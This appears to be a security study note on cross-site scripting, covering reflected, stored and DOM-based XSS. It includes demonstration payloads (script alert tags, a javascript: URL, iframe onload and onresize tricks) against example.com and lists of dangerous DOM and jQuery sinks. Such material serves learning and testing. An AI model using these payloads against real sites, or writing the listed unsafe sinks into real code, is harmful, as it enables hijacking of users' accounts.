---
title: XSS
category: Web
order: 21
---

Cross-site scripting (XSS) allows an attacker to compromise the interactions that users have with a vulnerable application.

There are three main types of XSS attacks. These are: 

* **Reflected XSS**: where the malicious script comes from the current HTTP request.
* **Stored XSS**: where the malicious script comes from the website database.
* **DOM-based XSS**: where the vulnerability exists in client-side code rather than server-side code.


# Reflected XSS

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. 

```
https://example.com/status?message=<script>alert(1)</script>
```

# Stored XSS

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. 

```
POST /post/comment HTTP/1.1
Host: example.com
Content-Length: 100

postId=3&comment=<script>alert(1)</script>&name=Carlos+Montoya&email=carlos%40normal-user.net
```

# DOM-based XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

Pay attention to the following sinks:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```


## DOM XSS in Jquery

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.

* Example of `attr()`

```js
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
We can use:

```
?returnUrl=javascript:alert(document.domain)
```

* Example of `hashchange`

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

We can use:

```
<iframe src="https://example.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Pay attention to the following jQuery functions:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

# XSS contexts

Visit the following link to see all posible tags and attributes.

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)



We can use an iframe to load the XSS and trigger it with javascript, an example of this is to use `onresize` attribute with the XSS payload and use `onload` attribute to resize it.

```
<iframe src="https://example.com/?search=%3Cbody+onresize=print()%3E" onload=this.style.width='10px'>
```
